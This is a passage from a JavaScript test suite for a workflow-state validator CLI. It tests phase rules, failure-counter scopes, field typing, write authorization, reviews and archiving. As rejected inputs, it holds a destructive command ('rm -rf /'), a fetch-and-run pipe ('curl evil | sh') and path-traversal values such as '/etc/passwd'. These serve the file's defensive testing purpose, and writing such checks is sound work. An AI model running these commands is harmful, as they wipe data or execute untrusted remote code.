  const v = cli(['validate'].concat(gflags(sb), ['--unit', unitDir(sb, 'p1b')]));
  assertRejected(v, 'phase-undeclared');
  const vm = messages(v, 'phase-undeclared');
  assert.equal(vm.length, 1, JSON.stringify(vm));
  assert.match(vm[0], STATE_PHASE_MSG);
});

test('phase recorded without its approval decision is rejected', () => {
  const sb = sandbox();
  create(sb, 'p2');
  ok(routeTo(sb, 'p2', 'research', 'approve-phase'));
  rejectsAtomically(sb, 'p2', (s) => { s.phase = 'chore'; }, [{ event_type: 'route' }], 'phase-unrecorded');
});

test('the approval decision recording the phase is made at the shared first node', () => {
  const sb = sandbox();
  create(sb, 'p3');
  ok(routeTo(sb, 'p3', 'research', 'approve-phase'));
  put(sb, 'p3', 'research/decision-1.md');
  rejectsAtomically(sb, 'p3', (s) => {
    s.phase = 'chore';
    s.human_decisions.push(Object.assign(approvalDecision('chore'), { node: 'build' }));
  }, [{ event_type: 'human-decision' }], 'state-invalid');
});

test('phase is immutable once recorded', () => {
  const { sb, id } = forkBuildDirect();
  put(sb, id, 'research/decision-2.md');
  rejectsAtomically(sb, id, (s) => {
    s.phase = 'feat';
    s.human_decisions.push(approvalDecision('feat', 2));
  }, [{ event_type: 'human-decision' }], 'phase-immutable');
  rejectsAtomically(sb, id, (s) => { s.phase = null; }, [{}], 'phase-immutable');
});

test('maintenance phase binds to the maintenance-due trigger, both ways', () => {
  const sb = sandbox();
  create(sb, 'mb1', 'prompt');
  ok(routeTo(sb, 'mb1', 'research', 'approve-phase'));
  put(sb, 'mb1', 'research/decision-1.md');
  const mk = (phase) => (s) => { s.phase = phase; s.human_decisions.push(approvalDecision(phase)); };
  rejectsAtomically(sb, 'mb1', mk('maintenance'), [{ event_type: 'human-decision' }], 'maintenance-binding');
  create(sb, 'mb2', 'maintenance-due');
  ok(routeTo(sb, 'mb2', 'research', 'approve-phase'));
  put(sb, 'mb2', 'research/decision-1.md');
  rejectsAtomically(sb, 'mb2', mk('chore'), [{ event_type: 'human-decision' }], 'maintenance-binding');
  ok(write(sb, 'mb2', mk('maintenance'), [{ event_type: 'human-decision' }]));
});

// ---------------------------------------------------------------------------
// outcome / terminal

test('outcome pairs with a terminal current node', () => {
  const { sb, id } = forkBuildDirect();
  rejectsAtomically(sb, id, (s) => { s.outcome = 'shipped'; }, [{}], 'outcome-terminal-pairing');
  rejectsAtomically(sb, id, (s) => { s.current_node = 'ship'; s.walked_path.push('ship'); s.current_task = null; }, [{}], 'outcome-terminal-pairing');
  rejectsAtomically(sb, id, (s) => { s.current_node = 'ship'; s.walked_path.push('ship'); s.current_task = null; s.outcome = 'ended'; s.outcome_reason = 'x'; }, [{}], 'outcome-terminal-pairing');
  rejectsAtomically(sb, id, (s) => { s.current_node = 'end'; s.walked_path.push('end'); s.current_task = null; s.outcome = 'ended'; s.outcome_reason = null; }, [{}], 'outcome-terminal-pairing');
});

// ---------------------------------------------------------------------------
// problems and escalation

function problem(over) {
  return Object.assign({ problem_key: 'build-direct.verify-build#1', scope: 'build-direct.verify-build', signature: 'tests:fail', opened_by: 'signature', blocked_node: 'build-direct', inherited: 0, supersedes: null, count: 0, advice: [], status: 'open' }, over || {});
}

test('blocked node is set if and only if a problem is open', () => {
  const { sb, id } = forkBuildDirect();
  rejectsAtomically(sb, id, (s) => { s.advisor_consults.push(problem()); }, [{}], 'blocked-iff-open');
  rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; }, [{}], 'blocked-iff-open');
  ok(write(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem()); s.fail_counters['build-direct.verify-build'] = { signature: 'tests:fail', count: 2, total: 2 }; }, [{}]));
  ok(write(sb, id, (s) => { s.blocked_at = null; s.advisor_consults[0].status = 'resolved'; }, [{}]));
});

test('consultation count is bounded by the graph cap and matches its advice', () => {
  const { sb, id } = forkBuildDirect();
  [1, 2, 3].forEach((n) => put(sb, id, 'build-direct/advice-' + n + '.md'));
  const logId = nextLines(sb, id, [{}], 'build-direct')[0].id;
  const adv = (n) => ({ file: 'build-direct/advice-' + n + '.md', date: T0, log_ref: logId });
  rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem({ count: 3, advice: [adv(1), adv(2), adv(3)] })); }, [{}], 'consult-cap');
  rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem({ count: 2, advice: [adv(1)] })); }, [{}], 'consult-count');
  ok(write(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem({ count: 2, advice: [adv(1), adv(2)] })); }, [{}]));
});

test('supersession inherits the count; total-cap problems cannot be superseded', () => {
  const { sb, id } = forkBuildDirect();
  put(sb, id, 'build-direct/advice-1.md');
  const logId = nextLines(sb, id, [{}], 'build-direct')[0].id;
  const adv = { file: 'build-direct/advice-1.md', date: T0, log_ref: logId };
  const old = (over) => problem(Object.assign({ count: 1, advice: [adv], status: 'superseded' }, over));
  const succ = (over) => problem(Object.assign({ problem_key: 'build-direct.verify-build#2', signature: 'lint:fail', inherited: 1, supersedes: 'build-direct.verify-build#1', count: 1, advice: [] }, over));
  rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(old({ opened_by: 'total' }), succ()); }, [{}], 'total-cap-superseded');
  rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(old(), succ({ inherited: 0, count: 0 })); }, [{}], 'state-invalid');
  ok(write(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(old(), succ()); }, [{}]));
});

test('advice pointer and log_ref must resolve', () => {
  const { sb, id } = forkBuildDirect();
  const logId = nextLines(sb, id, [{}], 'build-direct')[0].id;
  rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem({ count: 1, advice: [{ file: 'build-direct/advice-9.md', date: T0, log_ref: logId }] })); }, [{}], 'pointer-dangling');
  put(sb, id, 'build-direct/advice-1.md');
  rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem({ count: 1, advice: [{ file: 'build-direct/advice-1.md', date: T0, log_ref: 'L-9999' }] })); }, [{}], 'evidence-dangling');
});

test('a problem scope follows the scope grammar', () => {
  const { sb, id } = forkBuildDirect();
  const bad = (scope) => rejectsAtomically(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem({ problem_key: scope + '#1', scope: scope })); }, [{}], 'scope-invalid');
  bad('node:build-direct');
  bad('build-direct.ghost');
  ok(write(sb, id, (s) => { s.blocked_at = 'build-direct'; s.advisor_consults.push(problem({ problem_key: 'edge:build-direct-review#1', scope: 'edge:build-direct-review', opened_by: 'edge-revisit' })); }, [{}]));
});

// ---------------------------------------------------------------------------
// counters and scopes

test('failure counter scopes: <node>.<task>, edge:<from>-<to>; the 1.x forms and unknowns are rejected', () => {
  const { sb, id } = forkBuildDirect();
  const c = { signature: 'x', count: 1, total: 1 };
  ok(write(sb, id, (s) => { s.fail_counters['build-direct.verify-build'] = c; s.fail_counters['edge:build-direct-review'] = { signature: null, count: 1, total: 1 }; }, [{}]));
  const bad = (scope) => rejectsAtomically(sb, id, (s) => { s.fail_counters[scope] = c; }, [{}], 'scope-invalid');
  bad('node:build-direct'); // 1.x node scope
  bad('ticket:T-1'); // 1.x <kind>:<id> scope
  bad('build-direct.nope'); // task not in the node's pipeline
  bad('ghost.verify-build'); // undeclared node
  bad('review.verify-build'); // declared task, but not in review's pipeline
  bad('build-direct'); // bare node
  bad('edge:build-direct-wrap'); // undeclared edge
  rejectsAtomically(sb, id, (s) => { s.fail_counters['build-direct.verify-build'] = { signature: 'x', count: 3, total: 1 }; }, [{}], 'state-invalid');
});

test('per-item scopes exist only where their concept does', () => {
  const { sb, id } = forkBuild();
  const c = { signature: 'x', count: 1, total: 1 };
  const scopeOk = (scope) => ok(write(sb, id, (s) => { s.fail_counters[scope] = c; }, [{}]));
  const scopeBad = (scope, why) => {
    const r = rejectsAtomically(sb, id, (s) => { s.fail_counters[scope] = c; }, [{}], 'scope-invalid');
    const msgs = messages(r, 'scope-invalid');
    assert.ok(msgs.some((m) => m.includes(scope)), 'names the scope');
    if (why) assert.ok(msgs.some((m) => why.test(m)), 'expected ' + why + ', got ' + JSON.stringify(msgs));
  };
  scopeOk('build.verify-build'); // task scope
  scopeOk('build.verify-build:T-1'); // verify-build reads state:current_ticket and T-1 is a ticket
  scopeOk('build.implement-ticket:T-2'); // any record of the rule's items_field
  scopeOk('edge:build-ticket');
  scopeBad('build.verify-build:T-9', /names no existing record "T-9" \(a scope exists only where its concept does\)/); // no such ticket
  scopeBad('ticket.decompose-tickets:T-1', /names an item, but task "decompose-tickets" reads no re-entry progress field \(a scope exists only where its concept does\)/); // does not read the progress field
  scopeBad('build.provision-worktree:T-1', /names an item, but task "provision-worktree" reads no re-entry progress field/); // neither does provision-worktree
  scopeBad('build.nope'); // task not in the pipeline
  scopeBad('build.nope:T-1');
  scopeBad('node:build'); // 1.x
  scopeBad('ticket:T-1'); // 1.x
  scopeBad('edge:build-research'); // not a declared edge
});

test('an item scope cannot exist in a unit without the items', () => {
  const { sb, id } = forkBuildDirect();
  // review.review-change has no progress-field read; build-direct.verify-build does read it, but a chore unit holds no tickets
  rejectsAtomically(sb, id, (s) => { s.fail_counters['build-direct.verify-build:T-1'] = { signature: 'x', count: 1, total: 1 }; }, [{}], 'scope-invalid');
});

// ---------------------------------------------------------------------------
// graph-declared field typing, commands, evidence

test('declared field shape by catalog type: list, object, enum, undeclared keys, required fields, duplicate ids', () => {
  const { sb, id } = forkTicket();
  const rej = (mut, rule) => rejectsAtomically(sb, id, mut, [{}], rule);
  rej((s) => { s.tickets = 'nope'; }, 'type-mismatch');
  rej((s) => { s.tickets = [T('T-1', null, { status: 'weird' })]; }, 'value-not-allowed');
  rej((s) => { s.tickets = [T('T-1', null, { extra: 1 })]; }, 'undeclared-field');
  rej((s) => { s.tickets = [T('T-1'), T('T-1')]; }, 'scope-id-invalid');
  rej((s) => { s.tickets = [T('')]; }, 'scope-id-invalid');
  rej((s) => { s.tickets = ['T-1']; }, 'type-mismatch');
  rej((s) => { s.tickets = [T('T-1', null, { id: 5 })]; }, 'type-mismatch');
  rej((s) => { s.tickets = [T('T-1', null, { verification_command: null })]; }, 'type-mismatch'); // not nullable
  rej((s) => { s.current_ticket = 5; }, 'type-mismatch');
  rej((s) => { s.pending_tickets = ['T-1', 7]; }, 'type-mismatch');
  // a missing required object field names the field and the record
  const r = rej((s) => { const t = T('T-1'); delete t.evidence_refs; s.tickets = [t]; }, 'type-mismatch');
  assert.ok(messages(r, 'type-mismatch').some((m) => /tickets\[0\]\.evidence_refs is required/.test(m)), JSON.stringify(messages(r, 'type-mismatch')));
  // a command is a non-empty string
  rej((s) => { s.tickets = [T('T-1', null, { verification_command: '' })]; }, 'type-mismatch');
  rej((s) => { s.tickets = [T('T-1', 42)]; }, 'type-mismatch');
});

test('a nullable object is null or complete: contract_ref', () => {
  const { sb, id } = fork('contractRef', (sb2, id2) => { approved(sb2, id2, 'feat'); });
  // approve-phase is still in flight and produces contract_ref
  const rej = (mut, rule) => rejectsAtomically(sb, id, mut, [{}], rule);
  rej((s) => { s.contract_ref = { kind: 'path' }; }, 'type-mismatch'); // ref required
  rej((s) => { s.contract_ref = { kind: 'wiki', ref: 'x' }; }, 'value-not-allowed');
  rej((s) => { s.contract_ref = { kind: 'path', ref: 'x', extra: 1 }; }, 'undeclared-field');
  rej((s) => { s.contract_ref = 'x'; }, 'type-mismatch');
  ok(write(sb, id, (s) => { s.contract_ref = { kind: 'openspec-change', ref: 'csv-export' }; }, [{}]));
  ok(write(sb, id, (s) => { s.contract_ref = null; }, [{}]));
});

test('every catalog type is checked: string values, integer, number, boolean, command, pointer, evidence-ref, lists', () => {
  const extra = {
    mode: { type: 'string', values: ['fast', 'slow'], default: 'fast' },
    round: { type: 'integer', default: 0 },
    ratio: { type: 'number', default: 0 },
    flag: { type: 'boolean', default: false },
    hook: { type: 'command', default: 'npm test' },
    doc: { type: 'pointer', nullable: true, default: null },
    proof: { type: 'evidence-ref', nullable: true, default: null },
    notes: { type: 'list', default: [], items: { type: 'string', values: ['a', 'b'] } },
    hooks: { type: 'list', default: [], items: { type: 'command' } },
  };
  const sb = sandbox({
    types: extra,
    graph: (g) => { g.tasks['approve-phase'].produces.push(...Object.keys(extra).map((k) => 'state:' + k)); },
  });
  const id = 'ct';
  ok(create(sb, id));
  const r = ok(routeTo(sb, id, 'research', 'approve-phase'));
  assert.deepEqual(r.json.materialized.sort(), ['contract_ref', ...Object.keys(extra)].sort());
  assert.equal(readState(sb, id).hook, 'npm test', 'defaults are cloned from the catalog');
  put(sb, id, 'research/proof.md');
  const rej = (mut, rule) => rejectsAtomically(sb, id, mut, [{}], rule);
  rej((s) => { s.mode = 'medium'; }, 'value-not-allowed');
  rej((s) => { s.mode = 3; }, 'type-mismatch');
  rej((s) => { s.round = 1.5; }, 'type-mismatch');
  rej((s) => { s.round = '1'; }, 'type-mismatch');
  rej((s) => { s.ratio = 'x'; }, 'type-mismatch');
  rej((s) => { s.flag = 'yes'; }, 'type-mismatch');
  rej((s) => { s.hook = ''; }, 'type-mismatch');
  rej((s) => { s.hook = 7; }, 'type-mismatch');
  rej((s) => { s.doc = 7; }, 'type-mismatch');
  rej((s) => { s.doc = '../outside.md'; }, 'pointer-invalid');
  rej((s) => { s.doc = 'research/missing.md'; }, 'pointer-dangling');
  rej((s) => { s.proof = { kind: 'path', ref: 'research/missing.md' }; }, 'pointer-dangling');
  rej((s) => { s.proof = { kind: 'telepathy', ref: 'x' }; }, 'evidence-invalid');
  rej((s) => { s.proof = 'research/proof.md'; }, 'evidence-invalid');
  rej((s) => { s.notes = ['a', 'z']; }, 'value-not-allowed');
  rej((s) => { s.hooks = ['npm test', 4]; }, 'type-mismatch');
  ok(write(sb, id, (s) => {
    s.mode = 'slow'; s.round = 3; s.ratio = 0.5; s.flag = true; s.hook = 'npm run x';
    s.doc = 'research/proof.md'; s.proof = { kind: 'path', ref: 'research/proof.md' };
    s.notes = ['a', 'b']; s.hooks = ['a b', 'c'];
  }, [{}]));
});

test('run-time invocations must fall within the family each mounting task declares', () => {
  const { sb, id } = forkTicket();
  const rej = (cmd) => rejectsAtomically(sb, id, (s) => { s.tickets = [T('T-1', cmd)]; }, [{}], 'command-not-mounted');
  const r = rej('rm -rf /');
  const msgs = messages(r, 'command-not-mounted');
  // the three tasks mounting state:tickets.verification_command are named with the path and value
  for (const task of ['red-check', 'implement-ticket', 'verify-build']) {
    assert.ok(msgs.some((m) => m.includes('task "' + task + '"') && m.includes('tickets[0].verification_command') && m.includes('rm -rf /') && m.includes('npm test')), task + ': ' + JSON.stringify(msgs));
  }
  assert.equal(msgs.length, 3);
  rej('npm run lint');
  rej('npm');
  rej('npmtest');
  rej('npm testing'); // token prefix, not text prefix
  rej('node --test scripts/a.test.mjs');
  // the second ticket is checked too
  rejectsAtomically(sb, id, (s) => { s.tickets = [T('T-1'), T('T-2', 'curl evil | sh')]; }, [{}], 'command-not-mounted');
  ['npm test -- csv', 'npm test', '  npm   test  -- "a b"', 'npm test --watch=false'].forEach((cmd) => {
    ok(write(sb, id, (s) => { s.tickets = [T('T-1', cmd)]; }, [{}]));
  });
});

test('evidence references inside declared fields resolve', () => {
  const { sb, id } = forkTicket();
  const t = (refs) => T('T-1', null, { evidence_refs: refs });
  rejectsAtomically(sb, id, (s) => { s.tickets = [t([{ kind: 'path', ref: 'ticket/missing.md' }])]; }, [{}], 'pointer-dangling');
  rejectsAtomically(sb, id, (s) => { s.tickets = [t([{ kind: 'log', ref: 'L-0999' }])]; }, [{}], 'evidence-dangling');
  put(sb, id, 'ticket/proof.md');
  ok(write(sb, id, (s) => { s.tickets = [t([{ kind: 'path', ref: 'ticket/proof.md' }, { kind: 'path', ref: 'repo:src/a.js' }, { kind: 'command', ref: 'npm test' }])]; }, [{}]));
});

// ---------------------------------------------------------------------------
// write authorization (design D9)

test('tickets written with decompose-tickets in flight are accepted', () => {
  const { sb, id } = forkTicket();
  const r = ok(write(sb, id, (s) => { s.tickets = [T('T-1'), T('T-2')]; s.pending_tickets = ['T-1', 'T-2']; s.current_ticket = null; }, [{}]));
  assert.equal(r.json.action, 'written');
});

test('tickets written with another task in flight are rejected, naming the field and the task', () => {
  const { sb, id } = forkBuild(); // implement-ticket is not in flight yet: verify-build is
  ok(dispatch(sb, id, 'implement-ticket'));
  const r = rejectsAtomically(sb, id, (s) => { s.tickets = [T('T-1'), T('T-2'), T('T-3')]; }, [{}], 'write-unauthorized');
  const msg = messages(r, 'write-unauthorized').join('\n');
  assert.match(msg, /field "tickets"/);
  assert.match(msg, /task "implement-ticket"/);
  assert.match(msg, /does not produce state:tickets/);
});

test('a write with no task in flight is rejected, stating so', () => {
  const { sb, id } = forkDecomposed();
  ok(dispatch(sb, id, null));
  const r = rejectsAtomically(sb, id, (s) => { s.tickets = [T('T-1'), T('T-2'), T('T-3')]; }, [{}], 'write-unauthorized');
  assert.match(messages(r, 'write-unauthorized').join('\n'), /field "tickets" changed with no task in flight/);
  const p = rejectsAtomically(sb, id, (s) => { s.pending_tickets = []; }, [{}], 'write-unauthorized');
  assert.match(messages(p, 'write-unauthorized').join('\n'), /field "pending_tickets"/);
});

test('the task in flight is the stored position, not the draft position', () => {
  const { sb, id } = forkTicket(); // decompose-tickets stored in flight
  // moving the position away in the same write does not revoke the authorization of the stored one
  ok(write(sb, id, (s) => { s.tickets = [T('T-1')]; s.pending_tickets = ['T-1']; s.current_task = null; }, [{}]));
  // and a draft that merely claims a producing task in flight gains nothing
  rejectsAtomically(sb, id, (s) => { s.tickets = [T('T-1'), T('T-2')]; s.pending_tickets = ['T-1', 'T-2']; s.current_task = 'decompose-tickets'; }, [{}], 'write-unauthorized');
});

test('phase is written with approve-phase in flight; any other position is rejected', () => {
  // accepted: the approved() builder records the phase with approve-phase stored in flight
  const done = fork('contractRef', (sb2, id2) => { approved(sb2, id2, 'feat'); });
  assert.equal(readState(done.sb, done.id).phase, 'feat');
  // research-request in flight
  const sb = sandbox();
  create(sb, 'w1');
  ok(routeTo(sb, 'w1', 'research', 'research-request'));
  put(sb, 'w1', 'research/decision-1.md');
  const record = (s) => { s.phase = 'feat'; s.human_decisions.push(approvalDecision('feat')); };
  const r = rejectsAtomically(sb, 'w1', record, [{ event_type: 'human-decision' }], 'write-unauthorized');
  const msg = messages(r, 'write-unauthorized').join('\n');
  assert.match(msg, /field "phase"/);
  assert.match(msg, /task "research-request"/);
  // no task in flight
  ok(dispatch(sb, 'w1', null));
  const n = rejectsAtomically(sb, 'w1', record, [{ event_type: 'human-decision' }], 'write-unauthorized');
  assert.match(messages(n, 'write-unauthorized').join('\n'), /no task in flight/);
  // approve-phase in flight: accepted, with its approval decision
  ok(dispatch(sb, 'w1', 'approve-phase'));
  ok(write(sb, 'w1', record, [{ event_type: 'human-decision' }]));
  assert.equal(readState(sb, 'w1').phase, 'feat');
});

test('contract_ref is written by the tasks that produce it only', () => {
  const { sb, id } = forkSpec(); // author-contract in flight at spec
  ok(write(sb, id, (s) => { s.contract_ref = { kind: 'openspec-change', ref: 'csv-export' }; }, [{}]));
  ok(dispatch(sb, id, 'approve-contract')); // does not produce state:contract_ref
  const r = rejectsAtomically(sb, id, (s) => { s.contract_ref = null; }, [{}], 'write-unauthorized');
  assert.match(messages(r, 'write-unauthorized').join('\n'), /field "contract_ref".*task "approve-contract"/);
});

test('materialization at routing needs no producer: the default is the baseline', () => {
  const sb = sandbox();
  create(sb, 'mat');
  // research-request is routed in; contract_ref appears with its default (checked above as accepted)
  ok(routeTo(sb, 'mat', 'research', 'research-request'));
  // but a non-default value on the materializing write is a change the in-flight task (none) cannot make
  create(sb, 'mat2');
  rejectsAtomically(sb, 'mat2', (s) => { s.current_node = 'research'; s.walked_path.push('research'); s.contract_ref = { kind: 'path', ref: 'x' }; }, [{}], 'write-unauthorized');
});

test('re-entry bookkeeping: selecting pending_tickets[0] into current_ticket is accepted without a producing task', () => {
  const { sb, id } = forkDecomposed();
  ok(dispatch(sb, id, null));
  ok(write(sb, id, (s) => { s.pending_tickets = ['T-2']; s.current_ticket = 'T-1'; }, [{ event_type: 'route' }]));
  const s = readState(sb, id);
  assert.deepEqual(s.pending_tickets, ['T-2']);
  assert.equal(s.current_ticket, 'T-1');
  // the next selection, from the build node with an unrelated task in flight
  ok(routeTo(sb, id, 'build', 'verify-build'));
  ok(write(sb, id, (st) => { st.pending_tickets = []; st.current_ticket = 'T-2'; }, [{ event_type: 'route' }]));
});

test('re-entry bookkeeping: a selection must take the first element and leave the rest in order', () => {
  const { sb, id } = forkDecomposed();
  ok(dispatch(sb, id, null));
  const rej = (mut) => rejectsAtomically(sb, id, mut, [{}], 'write-unauthorized');
  const r = rej((s) => { s.pending_tickets = ['T-1']; s.current_ticket = 'T-2'; }); // non-first element under declared order
  assert.match(messages(r, 'write-unauthorized').join('\n'), /first element/);
  rej((s) => { s.pending_tickets = ['T-2']; s.current_ticket = 'T-9'; }); // not an element of the list
  rej((s) => { s.pending_tickets = ['T-1', 'T-2']; s.current_ticket = 'T-1'; }); // the selected element was not removed
  rej((s) => { s.pending_tickets = []; s.current_ticket = 'T-1'; }); // more than the element removed
  rej((s) => { s.pending_tickets = ['T-2', 'T-3']; s.current_ticket = 'T-1'; }); // something added
  rej((s) => { s.pending_tickets = ['T-2']; }); // list changed without a selection
  rej((s) => { s.current_ticket = 'T-1'; }); // selection without the list losing the element
  rej((s) => { s.pending_tickets = ['T-2', 'T-1']; }); // reordered
});

test('re-entry bookkeeping: a ticket status flip is accepted; other record fields may change', () => {
  const { sb, id } = forkBuild(); // verify-build in flight, which does not produce state:tickets
  ok(write(sb, id, (s) => { s.tickets[0].status = 'passed'; }, [{ event_type: 'verdict' }]));
  put(sb, id, 'build/verify-1.md');
  ok(write(sb, id, (s) => { s.tickets[0].evidence_refs = [{ kind: 'path', ref: 'build/verify-1.md' }]; s.tickets[1].status = 'failed'; }, [{ event_type: 'step' }]));
  assert.equal(readState(sb, id).tickets[0].status, 'passed');
});

test('re-entry bookkeeping: adding, removing, reordering, re-iding a ticket or changing its command is rejected', () => {
  const { sb, id } = forkBuild();
  const rej = (mut) => {
    const r = rejectsAtomically(sb, id, mut, [{}], 'write-unauthorized');
    const msg = messages(r, 'write-unauthorized').join('\n');
    assert.match(msg, /field "tickets"/);
    assert.match(msg, /task "verify-build"/);
    return msg;
  };
  rej((s) => { s.tickets.push(T('T-3')); });
  rej((s) => { s.tickets.pop(); });
  rej((s) => { s.tickets.reverse(); });
  rej((s) => { s.tickets[0].id = 'T-7'; });
  assert.match(rej((s) => { s.tickets[0].verification_command = 'npm test -- other'; }), /command-typed/);
  // a covered command is still a command change
  rej((s) => { s.tickets[1].verification_command = 'npm test'; });
  // bookkeeping on a status never excuses a simultaneous command change
  rej((s) => { s.tickets[0].status = 'passed'; s.tickets[0].verification_command = 'npm test -- x'; });
});

test('a task that produces the field may rewrite the whole list, ids and commands included', () => {
  const { sb, id } = forkSelected(); // no task in flight
  ok(routeTo(sb, id, 'ticket', 'decompose-tickets')); // route back into decomposition (re-entry of ticket)
  ok(write(sb, id, (s) => { s.tickets = [T('T-1', 'npm test -- redone'), T('T-3')]; s.pending_tickets = ['T-3']; }, [{ event_type: 'report' }]));
});

// ---------------------------------------------------------------------------
// reviews and decisions

const review = (over) => Object.assign({ id: 'R-1', node: 'build-direct', scope: 'build-direct.verify-build', verdict: 'pass', dimensions: [{ name: 'correctness', result: 'pass' }], evidence_refs: [{ kind: 'path', ref: 'build-direct/review-1.md' }], file: 'build-direct/review-1.md', date: T0 }, over || {});

test('review verdict records evidence and a resolving pointer', () => {
  const { sb, id } = forkBuildDirect();
  rejectsAtomically(sb, id, (s) => { s.reviews.push(review()); }, [{}], 'pointer-dangling');
  put(sb, id, 'build-direct/review-1.md');
  rejectsAtomically(sb, id, (s) => { s.reviews.push(review({ evidence_refs: [] })); }, [{}], 'state-invalid');
  rejectsAtomically(sb, id, (s) => { s.reviews.push(review({ dimensions: [{ name: 'c', result: 'fail' }] })); }, [{}], 'state-invalid');
  ok(write(sb, id, (s) => { s.reviews.push(review()); }, [{}]));
  rejectsAtomically(sb, id, (s) => { s.reviews[0].verdict = 'fail'; s.reviews[0].dimensions = [{ name: 'c', result: 'fail' }]; }, [{}], 'append-only-record');
});

test('reviews carry a <node>.<task>[:<item-id>] scope, validated like a counter scope; edge scopes and the 1.x target are rejected', () => {
  const { sb, id } = forkBuild();
  put(sb, id, 'build/review-1.md');
  const rv = (over) => review(Object.assign({ node: 'build', scope: 'build.verify-build', evidence_refs: [{ kind: 'path', ref: 'build/review-1.md' }], file: 'build/review-1.md' }, over));
  const rej = (over, rule) => rejectsAtomically(sb, id, (s) => { s.reviews.push(rv(over)); }, [{}], rule || 'scope-invalid');
  rej({ scope: 'build.verify-build:T-9' });
  rej({ scope: 'ticket.decompose-tickets:T-1' });
  rej({ scope: 'build.nope' });
  rej({ scope: 'node:build' });
  rej({ scope: 'edge:build-ticket' }); // edge scopes are counters', not reviews'
  rej({ scope: 'build' });
  rej({ scope: undefined }, 'state-invalid');
  rej({ scope: 7 }, 'state-invalid');
  rej({ target: { type: 'stage', id: 'build' } }, 'state-invalid'); // the 1.x key is gone
  ok(write(sb, id, (s) => { s.reviews.push(rv({ scope: 'build.verify-build:T-1' })); }, [{}]));
  ok(write(sb, id, (s) => { s.reviews.push(rv({ id: 'R-2', scope: 'build.verify-build' })); }, [{}]));
});

test('pointers must stay inside the folder and under a stage directory', () => {
  const { sb, id } = forkBuildDirect();
  put(sb, id, 'build-direct/review-1.md');
  fs.writeFileSync(path.join(sb.dir, 'outside.md'), 'x');
  for (const p of ['../outside.md', '/etc/passwd', 'state.json', 'log.ndjson', 'ghost/review-1.md', 'build-direct/../build-direct/review-1.md']) {
    rejectsAtomically(sb, id, (s) => { s.reviews.push(review({ file: p, evidence_refs: [{ kind: 'command', ref: 'npm test' }] })); }, [{}], 'pointer-invalid');
  }
});

test('a symlink escaping the folder is rejected', () => {
  const { sb, id } = forkBuildDirect();
  fs.writeFileSync(path.join(sb.dir, 'outside.md'), 'x');
  fs.mkdirSync(path.join(unitDir(sb, id), 'build-direct'), { recursive: true });
  fs.symlinkSync(path.join(sb.dir, 'outside.md'), path.join(unitDir(sb, id), 'build-direct', 'review-1.md'));
  rejectsAtomically(sb, id, (s) => { s.reviews.push(review()); }, [{}], 'pointer-escape');
});

test('human decisions need a resolving file and valid vocabulary', () => {
  const { sb, id } = forkBuildDirect();
  const h = (over) => Object.assign({ id: 'H-2', kind: 'escalation', node: 'build-direct', decision: 'retry', phase: null, target: null, file: 'build-direct/decision-1.md', date: T0 }, over);
  rejectsAtomically(sb, id, (s) => { s.human_decisions.push(h()); }, [{ event_type: 'human-decision' }], 'pointer-dangling');
  put(sb, id, 'build-direct/decision-1.md');
  const lineSpec = [{ event_type: 'human-decision', source_ref: 'build-direct/decision-1.md' }];
  rejectsAtomically(sb, id, (s) => { s.human_decisions.push(h({ decision: 'approved' })); }, lineSpec, 'state-invalid');
  rejectsAtomically(sb, id, (s) => { s.human_decisions.push(h({ decision: 'move-back', target: null })); }, lineSpec, 'state-invalid');
  ok(write(sb, id, (s) => { s.human_decisions.push(h({ decision: 'move-back', target: 'research' })); }, lineSpec));
});

// ---------------------------------------------------------------------------
// validate on stored units, lifecycle, archive

test('validate rejects a hand-edited stored state', () => {
  const sb = sandbox();
  create(sb, 'h1');
  const f = path.join(unitDir(sb, 'h1'), 'state.json');
  const s = JSON.parse(fs.readFileSync(f, 'utf8'));
  s.surprise = true;
  fs.writeFileSync(f, JSON.stringify(s));
  const r = cli(['validate'].concat(gflags(sb), ['--unit', unitDir(sb, 'h1')]));
  assertRejected(r, 'undeclared-field');
});

test('validate does no write authorization: a stored unit is judged by shape alone', () => {
  const { sb, id } = forkSelected();
  const f = path.join(unitDir(sb, id), 'state.json');
  const s = readJson(f);
  s.tickets.push(T('T-3')); // would need a producer to be written, but validate has no prior state
  fs.writeFileSync(f, JSON.stringify(s));
  ok(cli(['validate'].concat(gflags(sb), ['--unit', unitDir(sb, id)])));
});

test('validate reports a missing unit as not_found', () => {
  const sb = sandbox();
  const r = cli(['validate'].concat(gflags(sb), ['--unit', path.join(sb.dir, 'none')]));
  assert.equal(r.code, 5);
});

function shipUnit() {
  const sb = sandbox();
  const id = 'ship1';
  approved(sb, id, 'chore');
  ok(routeTo(sb, id, 'build-direct', 'provision-worktree'));
  ok(routeTo(sb, id, 'review', 'review-change'));
  ok(routeTo(sb, id, 'wrap', 'close-out'));
  ok(write(sb, id, (s) => { s.current_node = 'ship'; s.walked_path.push('ship'); s.current_task = 'archive-shipped'; s.outcome = 'shipped'; }, [{ event_type: 'route' }, { event_type: 'archive' }]));
  return { sb: sb, id: id };
}

test('archive requires handoff.md, then moves the whole frozen folder', () => {
  const { sb, id } = shipUnit();
  const dir = unitDir(sb, id);
  const early = cli(['archive'].concat(gflags(sb), ['--unit', dir]));
  assertRejected(early, 'archive-not-ready');
  assert.equal(fs.existsSync(dir), true);
  put(sb, id, 'handoff.md', '# handoff\n');
  const r = cli(['archive'].concat(gflags(sb), ['--unit', dir]));
  assert.equal(r.code, 0, r.stdout);
  assert.equal(r.json.action, 'archived');
  assert.equal(fs.existsSync(dir), false);
  assert.equal(fs.existsSync(path.join(sb.archive, id, 'state.json')), true);
  // an archived id can never be created again
  assert.equal(create(sb, id).code, 9);
});

test('archive refuses a unit without outcome or archive line', () => {
  const { sb, id } = forkBuildDirect();
  put(sb, id, 'handoff.md');
